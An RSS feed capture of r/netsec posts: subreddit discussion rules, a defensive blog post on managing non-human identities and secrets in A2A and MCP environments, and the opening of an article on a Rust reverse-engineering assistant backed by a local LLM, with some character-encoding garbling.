<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://news.securenza.be</link><description></description><item><title>r/netsec monthly discussion &amp; tool thread</title><link>https://www.reddit.com/r/netsec/comments/1jzrx4g/rnetsec_monthly_discussion_tool_thread/</link><author>/u/albinowax</author><category>netsec</category><pubDate>Tue, 15 Apr 2025 13:29:45 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Questions regarding netsec and discussion related directly to netsec are welcome here, as is sharing tool links.Always maintain civil discourse. Be awesome to one another - moderator intervention will occur if necessary.Avoid NSFW content unless absolutely necessary. If used, mark it as being NSFW. If left unmarked, the comment will be removed entirely.If linking to classified content, mark it as such. If left unmarked, the comment will be removed entirely.Avoid use of memes. If you have something to say, say it with real words.All discussions and questions should directly relate to netsec.No tech support is to be requested or provided on r/netsec.As always, the content & discussion guidelines should also be observed on r/netsec.Feedback and suggestions are welcome, but don't post it here. Please send it to the moderator inbox.]]></content:encoded></item><item><title>Theyâ€™re Everywhere! Why Non-Human Identities (and Their Security) Should Be Your Top Priority â€“ Ben DH Kim</title><link>https://bendh.kim/2025/04/15/theyre-everywhere-why-non-human-identities-and-their-security-should-be-your-top-priority/</link><author>/u/Opposite-Antelope-27</author><category>netsec</category><pubDate>Tue, 15 Apr 2025 10:58:31 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Hey everyone, letâ€™s talk about something thatâ€™s quietly taking over our digital world: Non-Human Identities (NHIs). You might not think about them much, but trust me, theyâ€™re everywhere, and how we handle them â€“ especially with all the Application-to-Application (A2A) chatter and Machine Communication Platforms (MCPs) popping up â€“ is becoming a massive deal for security.Think about it: automation, cloud services, AIâ€¦ all these amazing tools rely on something to talk to each other, right? That â€˜somethingâ€™ often has a digital identity â€“ an NHI. But hereâ€™s the catch: while these NHIs make things run smoothly, they can also open up huge security holes if weâ€™re not careful.In this post, I want to break down what NHIs are, why things like A2A and MCPs can make the risks worse, and most importantly, how we can actually use these same technologies to build a strong defense.So, What Exactly Are These â€œNon-Human Identitiesâ€?Getting to Know the MachinesFirst off, what is a Non-Human Identity (NHI)? Simply put, itâ€™s a digital ID for anything that isnâ€™t a person using your systems. Think machines, apps, automated scripts, services, or devices. While your login is tied to you, an NHI lets these non-human actors get things done â€“ accessing resources, moving data, running automated tasks.Youâ€™ve probably encountered NHIs without realizing it:API Keys: Giving apps permission to talk to each other.OAuth Tokens: Another way apps get secure access.Service Accounts: Special accounts for apps or background processes.System/Application Accounts: Similar accounts for system-level tasks.Machine IDs: Unique identifiers for servers, virtual machines, containers, or even those smart IoT gadgets.Digital Certificates (like SSL/TLS): Used to prove identity and encrypt communication.Secrets: Passwords, encryption keys, and other sensitive bits needed for access.We can even group these into categories like workload IDs (for things like Kubernetes), API IDs, or device IDs (like for your smart thermostat).One huge difference from human logins? Most NHIs canâ€™t use Multi-Factor Authentication (MFA). Humans get that extra layer of security, but NHIs often rely on static â€œsecretsâ€ like API keys or certificates. If that secret gets out, thereâ€™s often no second chance â€“ the attacker is in.Why NHIs Are Suddenly Everywhere (and Super Important)The rise of automation, cloud computing, AI, microservices, DevOps, and the Internet of Things (IoT) has made NHIs absolutely essential. Theyâ€™re the engine driving efficiency and scalability in modern businesses.Think about all the things NHIs enable:Running scheduled jobs automatically.Backing up critical data without anyone lifting a finger.Powering CI/CD pipelines for building and deploying software.Making Robotic Process Automation (RPA) possible.Connecting different apps and services so they can share data (A2A/M2M communication). API keys let programs access cloud resources, and service accounts automate tasks within cloud platforms.Managing cloud services, securing communication between microservices, enabling containers and VMs to interact, and authenticating countless IoT devices.Using digital certificates to create secure, encrypted connections.Basically, NHIs are the invisible workforce making modern IT tick. How well we manage and secure them directly impacts how efficiently and safely our businesses run.Humans vs. Machines: Why NHI Security is TrickyNHIs arenâ€™t just digital humans; they have unique characteristics that make securing them a whole different ballgame. There are WAY more NHIs than human users â€“ often 10x to 100x more! Managing that sheer volume is tough. Plus, unlike human accounts often managed centrally (like in HR systems), NHIs pop up everywhere â€“ different clouds, SaaS tools, on-prem systems â€“ created by various teams. This decentralization makes it hard to see everything, apply consistent rules, and keep control. The tech trends driving NHI growth (cloud, microservices) mean our old human-focused security methods just canâ€™t keep up. NHIs arenâ€™t tied to a person, so ownership can be murky. Whoâ€™s responsible for creating, using, and deleting them? Often, nobody knows for sure. Sometimes multiple apps or admins share one NHI, making tracking access a nightmare. Developers often create NHIs on the fly, sometimes without thinking through the security implications or giving them way too much power. As mentioned, MFA is usually off the table for NHIs. They rely on static credentials (keys, tokens, certificates, passwords). If those leak, itâ€™s game over. The decentralized nature makes protecting these static secrets even harder. Security canâ€™t just be the IT teamâ€™s job; it needs to be built-in from the start (â€œShift Leftâ€).Weird Lifecycles & Behavior: NHIs donâ€™t log in and out like people. Some live for seconds (like cloud workloads), others for years (hello, ancient service account!). Their automated actions can be hard to predict or track, and often lack detailed audit trails or context.These differences make NHIs harder to manage and more vulnerable than human accounts. With critical systems and AI relying more heavily on them, NHI security isnâ€™t just a tech issue â€“ itâ€™s a major business risk. We need specialized tools and strategies designed for NHIs.Untangling A2A and MCPs: How Machines TalkOkay, so NHIs need to communicate. Two terms youâ€™ll hear a lot are A2A (Application-to-Application) integration and MCPs (Machine Communication Platforms). Letâ€™s clarify what they are.A2A Integration: The Classic ConnectionThink of traditional A2A integration as the way different software within an organization talks directly, sharing data without someone manually typing it in. Itâ€™s about connecting systems like your CRM, ERP, and HR software so information flows smoothly. It can even help pull data from old legacy systems into newer ones.The main goal? Make business processes smoother and automated. It allows real-time data sharing, reduces errors from manual entry, and boosts efficiency. Often, it involves exchanging transaction data like sales orders or inventory updates.Typically, this happens through middleware platforms (like iPaaS) that translate between different application formats and protocols. Asynchronous messaging (where systems donâ€™t have to wait for each other) is common, often using web services like SOAP or REST. Security involves encryption and authentication, maybe using digital signatures or specific features within Privileged Access Management (PAM) tools. Usually, this communication happens within a trusted zone, like behind the company firewall.MCPs: Giving AI a Voice (Anthropicâ€™s Take)Now, Machine Communication Platforms (MCPs), especially the one Anthropic open-sourced, are a bit different. MCP is designed specifically to standardize how AI models (like LLMs) talk to the outside world. Instead of building custom connections every time an AI needs data or needs to use a tool, MCP provides a common language.The goal is a universal standard for AI models to connect safely and scalably with data stores, business tools, APIs, etc. This lets AI go beyond its training data, access real-time info, and use specialized tools to give much better, context-aware answers. Think of it like a â€œuniversal remoteâ€ or â€œUSB-C for AIâ€, enabling plug-and-play integration.It usually follows a client-server model:MCP Host: The AI app using the LLM (e.g., your IDE).MCP Client: Lives in the host app, manages connections to MCP servers.MCP Server: A lightweight program exposing specific functions (like file access, DB queries, API calls) via the MCP protocol.Communication uses JSON-RPC 2.0 messages, often over standard input/output locally or HTTP/SSE remotely. Itâ€™s two-way, so the AI can also trigger actions. Servers offer resources (data), prompts (templates), and tools (functions).Use cases include developers checking database status from their IDE or AI coding assistants getting context from documentation via an MCP server. It has potential for business tasks like customer support or marketing too.Security-wise, MCP intends to protect data, but the current spec lacks standardized authentication between clients and servers, or clear ways to handle credentials for third-party APIs. Its built-in permission model is also quite basic.Spotting the Difference: A2A vs. AI ProtocolsSo, traditional A2A, Anthropicâ€™s MCP, and even Googleâ€™s A2A (which focuses on AI agents talking to each other) all involve machine communication, but they have different goals:Traditional A2A: Internal systems sharing structured business data.Anthropicâ€™s MCP: AI models connecting to external tools/data for context (Vertical Integration).Googleâ€™s A2A: AI agents collaborating with other AI agents (Horizontal Integration). Agents use â€œAgent Cardsâ€ to discover each otherâ€™s capabilities.For this post, weâ€™re mainly focusing on traditional A2A and Anthropicâ€™s MCP. But the rise of agent-to-agent communication adds another layer of complexity to NHI security.Crucially, all these forms of machine communication rely heavily on NHIs (API keys, tokens, certificates, etc.). If the NHI security is weak, the communication channel built on it is also weak. Itâ€™s all connected. While A2A established the need for secure machine comms, the modern landscape of APIs and AI makes the challenge much bigger and more complex.How A2A/MCP Can Accidentally Make NHI Risks WORSEOkay, A2A and MCPs sound useful, right? They boost automation and efficiency. But hereâ€™s the scary part: if you donâ€™t manage them properly, they can seriously amplify existing NHI security risks. Think ID sprawl, exposed credentials, and configuration nightmares â€“ all leading to potential breaches.Feeding the Beast: Identity SprawlMore A2A connections and MCP integrations mean more NHIs. Every new API link, microservice interaction, or cloud service connection needs its own API key, service account, token, or certificate. Without clear rules for creating, tracking, managing, and deleting these NHIs, things get messy fast.In environments like the cloud or DevOps pipelines, itâ€™s super easy to spin up new NHIs. But often, thereâ€™s no central management or clear ownership. What happens when a project ends or someone leaves? Those NHIs might just hang around â€“ unused but still active. We call these â€œorphanedâ€ or â€œzombieâ€ IDs. Developers creating NHIs on the fly without proper oversight adds to the problem.This uncontrolled spread is ID Sprawl. It massively increases your attack surface. Every forgotten NHI is a potential backdoor for attackers. They love finding these less-monitored IDs to get their initial foothold.Danger Zone: Exposed Credentials in TransitSetting up A2A/MCP requires using NHI credentials (API keys, tokens, private keys, passwords). If managed poorly, these secrets are prime targets for exposure.A classic mistake? Hardcoding secrets directly into source code, config files, or deployment scripts. These can accidentally end up in public code repositories (like GitHub), get shared in forums, show up in CI/CD logs, or be stored insecurely in plain text files or spreadsheets. Sending them over unencrypted channels is another big no-no.Why is this so bad? Remember, most NHIs donâ€™t have MFA. Once a credential leaks, attackers can often just walk right in, pretending to be that legitimate NHI.With stolen credentials, attackers can steal sensitive data, perform unauthorized actions, and move laterally through your network to cause even more damage. Leaked API keys and certificates are major culprits in breaches. The push for automation combined with a lack of easy-to-use secret management tools makes risky practices like hardcoding far too common. Secure credential management needs to be part of the development process from day one.Lost in the Maze: Complexity, Misconfigurations, and Blind SpotsAs your A2A network or MCP ecosystem grows, the sheer number of NHIs and their connections becomes incredibly complex. This complexity breeds misconfigurations and makes it nearly impossible to keep a consistent eye on everything.Think about all the moving parts: countless microservices, different protocols, dynamic cloud resources, hybrid/multi-cloud setups, and NHI management spread across different teams.In this chaos, mistakes happen:Giving too much power: Violating the Principle of Least Privilege (POLP) by granting NHIs more permissions than they need is super common. Like giving write access when only read is needed.Leaving unnecessary ports/services open.Cloud resource configuration errors.Incorrect access control lists (ACLs) or firewall rules.Using old, unpatched software.This complexity also creates oversight gaps. Tracking every NHI action across all systems is a massive challenge. Logs are scattered, and different teams might apply different security rules. Verizon found misconfigurations cause over 20% of breaches â€“ itâ€™s a huge problem.These errors and blind spots give attackers easy ways in, cause unexpected downtime, and lead to compliance failures and fines. Remember the Capital One breach? That was partly due to an API misconfiguration. Itâ€™s a vicious cycle: ID sprawl increases complexity, which increases the chance of misconfigurations like over-privileging, making leaked credentials even more dangerous.New Protocols, New Problems: MCPâ€™s Own RisksNewer protocols like Anthropicâ€™s MCP are still evolving, which means they might have their own built-in vulnerabilities or configuration pitfalls. Standardizing AI-to-external-system communication is complex and can introduce new risks.A key issue is the lack of standardized authentication and authorization. MCP doesnâ€™t clearly define how clients and servers should authenticate each other, or how an MCP server should securely handle credentials when talking to third-party APIs on a userâ€™s behalf. This means security can vary wildly depending on how itâ€™s implemented. The permission model is also quite basic, potentially leading to loose access control.Multi-tenancy (where multiple users share the same service) is another challenge. MCP doesnâ€™t yet offer clear guidelines for handling separate authentication and permissions for different tenants.The complexity of the MCP architecture itself (host, client, server, transport layers) also creates opportunities for configuration errors.And then there are protocols like Googleâ€™s A2A for agent-to-agent communication. These raise new questions about data security when agents share info, how to verify agent trustworthiness, ensuring transparency and ethics, and the technical hurdles of integration. Since agents might act on a userâ€™s behalf, securing their credentials and limiting their permissions is critical. Experts predict AI agent abuse will be a growing source of breaches.The bottom line: new A2A/MCP protocols bring unique risks due to their novelty, complexity, and the introduction of AI agents. Organizations need to be aware of these. The inherent weaknesses of NHI security (no MFA, sprawl, credential exposure) make them prime targets. Attackers often prefer simply logging in with stolen NHI credentials rather than complex hacking, highlighting just how critical NHI security is in these interconnected environments.Flipping the Script: Using A2A/MCP for Better NHI SecurityOkay, weâ€™ve seen how A2A and MCP can make NHI risks scarier if managed poorly. But hereâ€™s the good news: when designed and implemented with strong security practices, these same technologies can become powerful tools for defending against NHI threats. Itâ€™s a double-edged sword.Secure A2A/MCP setups can provide:Centralized Control & Visibility: A single place to see and manage all those scattered NHIs.Automated Lifecycle Management: Automatically handle NHI creation, rotation, and deletion, reducing risk and effort.Secure Communication Channels: Lock down the pathways NHIs use to talk.Granular Access Control: Enforce the â€œneed-to-knowâ€ principle (Least Privilege).Auditing & Monitoring: Keep a close eye on what NHIs are doing.Getting Organized: Centralized Management and VisibilityYou canâ€™t protect what you canâ€™t see. The first step is getting a handle on all the NHIs floating around your organization and managing them centrally. Good Machine Identity Management (MIM) solutions or well-designed A2A/MCP frameworks are key here. These systems use automated tools to find every NHI (API keys, service accounts, certificates, etc.) across your entire infrastructure (on-prem, cloud, SaaS) and create a constantly updated list. This tackles ID sprawl and finds those forgotten â€œzombieâ€ IDs. A central dashboard gives you a single pane of glass to see and control all your NHIs. No more flying blind. Itâ€™s not enough to just list NHIs. You need to know why it exists, who owns it, what permissions it has, and what apps itâ€™s tied to. This context allows for smarter risk assessment and better access policies.Consistent Policy Enforcement: Define your security rules (encryption standards, credential rules, access policies) in one place and automatically apply them to all relevant NHIs. This ensures consistency and reduces the risk of gaps or errors that happen when policies are managed decentrally.Putting it on Autopilot: Automated Credential Lifecycle ManagementManually managing the lifecycle of thousands of NHI credentials is a recipe for disaster. Automation is essential. This covers everything from creation to deletion.Automated Provisioning/Issuance: Quickly and securely create new NHIs and credentials (especially certificates) according to your policies, avoiding manual errors.Automated Rotation/Renewal: This is HUGE. Automatically changing API keys, passwords, and certificates regularly (or when theyâ€™re about to expire) drastically shrinks the window an attacker has if a credential leaks. Using short-lived certificates that renew automatically is a great way to ditch risky long-lived secrets.Automated Revocation/Decommissioning: When an NHI is no longer needed or poses a risk, automatically disable or remove it and its credentials quickly and reliably. This cleans up orphaned IDs and prevents risks from improper offboarding.The benefits? Efficiency and fewer errors (managing thousands manually is impossible and error-prone), and stronger security (less risk from expired or stolen credentials). In todayâ€™s dynamic environments, automation isnâ€™t optional; itâ€™s mandatory. Manual approaches just canâ€™t scale.Locking Down the Lines: Secure Communication ChannelsBeyond managing the NHIs themselves, we need to secure the communication channels they use. This means ensuring data confidentiality and integrity, and building trust between communicating parties.Encrypt Everything in Transit: Use proven protocols like TLS/SSL to encrypt all data exchanged during A2A and MCP communication. This stops eavesdroppers and prevents data leaks. Tools like API gateways or service meshes can enforce the use of encrypted connections (like HTTPS). You might even encrypt the message content itself or add digital signatures for end-to-end security.Strong Mutual Authentication: Make sure both ends of the communication prove they are who they say they are. Go beyond simple API keys or passwords:
Mutual TLS (mTLS): Both client and server exchange and verify each otherâ€™s digital certificates. This is great at stopping Man-in-the-Middle (MITM) and spoofing attacks.OAuth 2.0 / OpenID Connect (OIDC): Standard protocols for delegating access securely. They use temporary access tokens, often via flows like Client Credentials Grant specifically designed for M2M communication, avoiding direct credential exposure. Just because an NHI is authenticated doesnâ€™t mean it should access everything. Verify what itâ€™s allowed to do. Use concepts like OAuth scopes to grant only the minimum necessary permissions. Always choose secure versions of protocols â€“ HTTPS over HTTP, SSH over Telnet, etc.Layering these techniques builds robust security for your communication channels.Need-to-Know Basis: Enforcing Granular Access Control (Least Privilege)A core principle for securing NHIs is the Principle of Least Privilege (POLP). This means any identity (human or not) should only have the absolute minimum permissions needed to do its specific job.Why is this critical for NHIs? They often need access to important stuff. If an over-privileged NHI gets compromised, the damage can be massive. Applying POLP limits what an attacker can do even if they do compromise an NHI.How to implement POLP effectively:Grant Minimal Permissions: When creating an NHI, define exactly what it needs to do (e.g., call this specific API, read that database table) and grant only those permissions. Remove unused permissions immediately.Role-Based Access Control (RBAC): Define roles (e.g., â€œbackup agentâ€) and assign the necessary permissions to the role, then assign the role to the NHI. This is more organized than assigning permissions individually.Attribute/Policy-Based Access Control (ABAC/PBAC): Make access decisions dynamically based on attributes of the NHI, the resource, and the context (time, location, etc.).Limit Scopes: When using protocols like OAuth, carefully define the scope of the access token to restrict what the NHI can do.Regular Access Reviews: Periodically check if the permissions granted to NHIs are still appropriate and necessary. Roles change, and permissions can creep up over time.Applying granular access control consistently helps slash risks from excessive permissions and aligns with Zero Trust principles.Keeping Watch: Comprehensive Auditing and MonitoringYou need to know what your NHIs are up to. Centralized management and automation enable comprehensive auditing and real-time monitoring. This helps you spot weird behavior or potential threats early, respond quickly, and meet compliance requirements. Log everything important an NHI does â€“ login attempts, credential requests, API calls, resource access, data changes. Logs should include who (NHI ID), what, when, where, and the outcome. Collect these logs centrally. Analyze logs and real-time activity to spot threats or policy violations. Set up baselines of normal NHI behavior and trigger alerts when deviations (anomalies) occur. Look for red flags: accessing unusual systems, downloading huge amounts of data, sudden spikes in failed logins, attempts to escalate privileges, access from suspicious IPs, activity at odd hours. AI and Machine Learning tools can help sift through the noise and find real threats. Detailed logs and monitoring data are essential for meeting regulations like PCI-DSS, GDPR, NIST standards, etc., which often require activity logging and review.Auditing and monitoring are non-negotiable. They improve threat detection and response, provide accountability, and help prove compliance. When combined with centralized management and automation, they significantly boost your NHI security posture. This proactive approach is far better than just reacting after a breach.Tech Deep Dive: Tools to Tame the NHI BeastLetâ€™s get a bit more technical. What specific tools and mechanisms can help us mitigate NHI risks in A2A/MCP environments?mTLS: The Two-Way HandshakeMutual TLS (mTLS) is like a secret handshake for machines. Unlike regular TLS where only the server proves its identity, with mTLS, both the client and the server show their credentials (digital certificates) and verify each other before starting to talk. This is super effective for M2M communication.Hereâ€™s the gist of the handshake: Client connects -> Server shows certificate -> Client verifies -> Client shows certificate -> Server verifies -> Secure connection established. Both sides need valid certificates from a trusted Certificate Authority (CA) and the corresponding private keys.Why is mTLS awesome for NHI security?Stops Man-in-the-Middle Attacks: Attackers canâ€™t jump in the middle because they donâ€™t have valid certificates for both sides.Prevents Spoofing: Faking an identity is nearly impossible without the correct certificate and private key.Neutralizes Credential Theft: Even if an API key or password leaks, the attacker still needs the certificate and key to connect. Makes credential stuffing and brute-force attacks much harder.Reduces Phishing Impact: Stolen user credentials arenâ€™t enough if mTLS is required.Secures APIs: Ensures only authenticated applications can make API calls.mTLS is particularly great for securing communication between microservices or IoT devices where thereâ€™s no human logging in. It relies on Public Key Infrastructure (PKI), and automating certificate lifecycle management (CLM) is crucial for making it work smoothly. It fits perfectly with the Zero Trust philosophy of verifying everything. You can often enforce mTLS using API gateways or service meshes.OAuth/OIDC: Delegating Access SecurelyOAuth 2.0 and OpenID Connect (OIDC) are the go-to standards for managing access permissions, especially when one application (an NHI) needs to access resources on another service (like an API).The core idea is to grant access without sharing the userâ€™s (or machineâ€™s) actual password. It uses temporary â€œAccess Tokensâ€. The client app gets a token from an Authorization Server and presents it to the Resource Server to get access.For M2M scenarios where no human is involved, OAuth offers specific flows:Client Credentials Grant: The client app uses its own ID and secret (or a JWT) to get an access token directly from the authorization server. Perfect for M2M.JWT Bearer Flow: The client uses an existing JWT it holds as proof to get an access token.Benefits of using OAuth/OIDC for M2M:No Direct Credential Sharing: Protects sensitive credentials.Scoped Access: You can limit what the access token allows the client to do (Scope), enforcing least privilege.Granular Control & Revocation: Tokens usually expire, and you can revoke specific tokens if needed.Standardization: Widely adopted standards mean better interoperability.Important Security Notes: You must protect the client credentials (ID/secret or JWT keys) themselves, often using a secrets management tool. Access tokens can still be stolen, so keep their lifetimes short and secure the communication channel (e.g., with mTLS). Always grant the minimum necessary scope, and make sure the resource server thoroughly validates incoming tokens. Be wary of malicious OAuth app registrations designed to trick users.OAuth/OIDC often works hand-in-hand with Identity Providers (IdPs), API gateways, and service meshes to form the backbone of NHI access control.API Gateways: The Central Security CheckpointAn API Gateway acts like a bouncer or front desk for your backend API services. In A2A/MCP scenarios, itâ€™s a crucial central point for enforcing security policies.How API Gateways boost NHI security:Centralized Authentication & Authorization: Instead of each backend service handling security, the gateway does it. It can check API keys, validate JWTs, process OAuth tokens, or perform mTLS handshakes. Once authenticated, it checks if the NHI is authorized for the specific request based on roles or scopes.Traffic Cop: Controls the flow of requests using rate limiting and throttling to prevent services from being overwhelmed, accidentally or maliciously (DoS/DDoS protection).Threat Shield: Acts as a first line of defense against common web attacks like SQL injection or XSS by validating incoming requests. Some offer DDoS mitigation and can add security headers to responses.Encryption Enforcement: Can force all communication to use TLS/HTTPS, protecting data in transit.Visibility & Auditing: Logs all API traffic, providing valuable data for monitoring, troubleshooting, security analysis, and compliance.In MCP environments, gateways can play a similar central role, managing authentication, authorization, traffic, and routing requests to the correct MCP servers, especially useful in multi-tenant setups.In short, API gateways simplify security management, reduce the load on backend services, and provide a robust, centralized control point for A2A/MCP communication.Secrets Management Solutions: Locking Down the KeysHandling NHI credentials (â€œsecretsâ€) securely is fundamental. Weâ€™re talking API keys, tokens, passwords, private keys, certificates â€“ all highly sensitive stuff. Hardcoding them or storing them insecurely is asking for trouble.Secrets Management Solutions are tools built specifically to solve this. Think HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, Google Cloud Secret Manager, CyberArk Conjur, Akeyless, etc. They provide secure storage, access control, rotation, and auditing for secrets throughout their lifecycle.Secure Central Vault: Store secrets encrypted in a hardened, central location. Some use Hardware Security Modules (HSMs) for extra key protection.Granular Access Control: Define precisely who or what (which NHI) can access which secret, using policies (RBAC/ABAC) based on least privilege.Dynamic Secrets: Generate temporary, short-lived credentials on demand (e.g., database passwords, cloud keys) that expire automatically. This drastically reduces the risk of long-lived secrets being exposed.Automated Rotation: Automatically change passwords, keys, and certificates on a schedule or based on policy. Reduces manual effort and prevents rotation lapses.Detailed Audit Logs: Track every access and operation on secrets for monitoring, threat detection, and compliance.Integration: Provide APIs and libraries to easily integrate with applications, CI/CD pipelines, Kubernetes, etc., allowing systems to fetch secrets securely at runtime instead of hardcoding them. Developer-friendliness is key.These tools are essential for reducing the complexity and risk of managing NHI credentials in A2A/MCP environments.Hereâ€™s a quick comparison table focusing on NHI use cases for some popular options:Table 1: Quick Look at Some Secrets Management Tools (NHI Focus)Akeyless (Alternative Example)Very Diverse (Keys, DB Creds, Cloud Keys, Certs, etc.)DB Creds, API Keys, OAuth Tokens, other stringsKeys, Secrets (strings), CertificatesDiverse (DB Creds, Cloud Keys, API Keys, Certs, SSH Keys, etc.)Policy-based (Flexible but complex), Many auth methodsAzure RBAC (Easy in Azure)Policy-based, RBAC, Akeyless authStrong support (AWS, DB, etc.)Limited (Mainly RDS DB Creds)Broad support (AWS, Azure, GCP, DB, K8s, etc.)Supported (May need some setup)Built-in (Mainly DB Creds)Built-in (Secrets, Keys, Certs)AWS CloudTrail IntegrationAzure Monitor IntegrationIntegration (Cloud, DevOps, K8s)Strong AWS integration, limited externalStrong Azure integration, K8s supportBroad cloud, DevOps, K8s supportOpen Source (Self-hosted), Enterprise (Self-hosted), HCP (SaaS)Fully Managed SaaS (Azure)High complexity (esp. Self-hosted)High ease of use, low ops burdenOS free, Enterprise/HCP paid (Can be high)Subscription-based, claims lower TCOFlexibility, Broad Integration, Dynamic SecretsSeamless AWS integration, Managed ServiceSeamless Azure integration, Cert ManagementEase of Use, Broad Automation, SaaSComplexity, Cost, Community support for some integrationsAWS lock-in, Limited dynamic/external featuresAzure lock-in, Limited dynamic/external featuresNewer player, might lack some niche Vault featuresRemember, these tools work best together in a layered defense strategy. For example, use an API Gateway with mTLS, authorized by OAuth, with the secrets stored in Vault. But technology alone isnâ€™t enough. You need good governance, skilled people, and continuous validation to truly secure NHIs in A2A/MCP setups. Choose tools wisely based on your specific needs and environment.Making it Happen: Strategic Steps for Secure A2A/MCPAlright, we know the risks and the tools. How do we put this into practice strategically?Weaving it Together: Integrating A2A/MCP Security into NHI and Zero TrustNHI security isnâ€™t a silo. It must be part of your overall cybersecurity strategy, especially your Zero Trust architecture and identity governance plans. Secure A2A/MCP practices are the foundation for making this happen.Zero Trustâ€™s mantra is â€œNever trust, always verifyâ€. This applies just as much (if not more) to NHIs as it does to humans. Every access request needs continuous verification based on identity, device state, and context, with access granted based on least privilege.Secure A2A/MCP practices directly enable Zero Trust for NHIs:mTLS provides strong identity verification for machines.API Gateways and Secrets Management tools act as central points for enforcing access control and least privilege.Automated lifecycle management and monitoring allow for continuous validation and anomaly detection.So, donâ€™t treat NHI security or A2A/MCP security as separate projects. Integrate them into your broader Zero Trust roadmap. This provides a more systematic way to manage risks, ensure consistent security, and strengthen your overall defense. Prioritize investments in secure A2A/MCP technologies and processes as part of your Zero Trust journey.Where to Start? Prioritizing Key Security ActionsTrying to do everything at once is overwhelming. Based on risk and impact, hereâ€™s a suggested priority list for securing NHIs in A2A/MCP environments:Get Visibility (Highest Priority): You MUST know what NHIs you have and how theyâ€™re used. Use discovery tools, build a central inventory, and gather context (owner, purpose, permissions). Without visibility, youâ€™re flying blind.Lock Down Secrets (High Priority): Leaked credentials are a top threat. Implement a secrets management solution (Vault, AWS Secrets Manager, etc.). Eradicate hardcoded secrets from code and configs; make apps fetch secrets securely at runtime.Enforce Least Privilege (High Priority): Over-privileged NHIs amplify breach damage. Strictly apply POLP â€“ grant only the minimum permissions needed for the specific task. Use RBAC/ABAC and conduct regular access reviews to trim excess permissions.Automate Lifecycle Management (Medium-High Priority): Long-lived, static credentials are risky. Automate credential rotation (especially for certificates and keys) and decommissioning. Use short-lived credentials where possible and ensure unused NHIs are promptly disabled.Use Strong Authentication & Encryption (Medium Priority): Move beyond basic API keys. Implement stronger methods like mTLS for mutual authentication. Always encrypt communication channels using TLS/HTTPS.Monitor & Audit Everything (Medium Priority): Continuous monitoring and detailed logging are crucial for detecting anomalies and investigating incidents. Set up centralized logging and use analytics (maybe AI/ML) to spot suspicious behavior.This is a general guide; tailor it to your organizationâ€™s specific risks and resources. The key is to treat NHI security as an ongoing process, not a one-off project.The Cost of Doing Nothing: Business Impacts of NHI NeglectIgnoring NHI security isnâ€™t just a tech problem; itâ€™s a major business risk with potentially devastating consequences. This is the big one. Stolen NHI credentials can give attackers the keys to your sensitive data kingdom (customer info, IP, financials). Breaches cost millions on average . High-profile companies like Equifax, Capital One, Tesla, CircleCI, and T-Mobile have all suffered NHI-related breaches. Expired certificates or compromised service accounts can bring critical business processes grinding to a halt. In todayâ€™s automated world, this means lost productivity, lost revenue, and unhappy customers. Many organizations report outages due to certificate issues. Regulations like GDPR, PCI-DSS, and various NIST/ISO standards have strict rules about data protection and access control. Failing to secure NHIs can lead to massive fines (GDPR fines can be up to 4% of global turnover), lawsuits, and business restrictions . Breaches and outages severely damage trust with customers, partners, and investors . Rebuilding that trust takes a long time and a lot of effort.Bottom line: NHI security is a strategic imperative for business continuity and growth. Investing in proper management and defense isnâ€™t just about avoiding disaster; itâ€™s about enabling secure, sustainable operations.Wrapping Up: Taming the Machine Identity MazeSo, there you have it. Non-Human Identities are powerful enablers but also significant risks, especially with the rise of A2A communication and MCPs. While poor management can amplify threats like ID sprawl and credential leaks, a proactive, security-focused approach can turn these technologies into powerful defenses.The key is visibility, automation, and integration. See your NHIs, automate their lifecycle and security checks, and weave NHI security into your broader Zero Trust strategy. Prioritize actions like locking down secrets and enforcing least privilege.Itâ€™s not just an IT task anymore; itâ€™s a core business requirement. Ignoring NHI security is rolling the dice with your data, operations, compliance, and reputation. By embracing secure A2A/MCP practices and robust NHI management, we can navigate the complexities of the modern digital landscape safely and effectively.]]></content:encoded></item><item><title>Aiding reverse engineering with Rust and a local LLM</title><link>https://security.humanativaspa.it/aiding-reverse-engineering-with-rust-and-a-local-llm/</link><author>/u/0xdea</author><category>netsec</category><pubDate>Tue, 15 Apr 2025 04:40:44 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[â€œA large fraction of the flaws in software development are due to programmers not fully understanding all the possible states their code may execute in.â€
â€” John CarmackThereâ€™s a new entry in my ever-growing tool suite, designed to assist with vulnerability research against binary targets: oneiromancer.Itâ€™s a reverse engineering assistant that uses a fine-tuned, locally running LLM to aid with code analysis. It can analyze a function or a smaller code snippet, returning a high-level description of what the code does, a recommended name for the function, and variable renaming suggestions based on the results of the analysis.As youâ€™ve probably guessed, oneiromancer is written in  ðŸ¦€ While working on this tool, I also contributed the new  category to crates.io. I hope youâ€™ll find it useful for your projects.This article is the fourth installment in our Offensive Rust series. In it, I will introduce my new tool and guide you further along your journey into Rust programming. Letâ€™s dive in!The awesome idalib Rust bindings were awarded a well-deserved third place! But another project caught my attention among the winners: aiDAPal by Atredis Partners. Itâ€™s an IDA Pro plugin that uses a  that has been fine-tuned for Hex-Rays pseudo-code to assist with code analysis.Personally, Iâ€™m not buying into the current frenzy around and large language models in general. However, I grudgingly have to recognize that thereâ€™s more to LLMs than just hype (stay tuned to this blog for some innovative developments in this field that we canâ€™t disclose just yet). Anyway, the premise behind aiDAPal intrigued me, and therefore I decided to .Since the fine-tuned model is freely available on Hugging Face under a permissive license, I thought I could write  to query it. And in my never-ending quest to become a better Rust programmer, I decided to write it in Rust. Really fell in love with this language! I never considered myself a  to begin with (although Iâ€™ve always enjoyed coding since I started as a kid with BASIC in the 80s), and Iâ€™m definitely no evangelist. I couldnâ€™t care less which language you use ðŸ¤· However,  has got something that makes me really want to keep digging deeper and building stuff. But I digressâ€¦â€œSecret agent man, secret agent man
Theyâ€™ve given you a number
And taken away your nameâ€
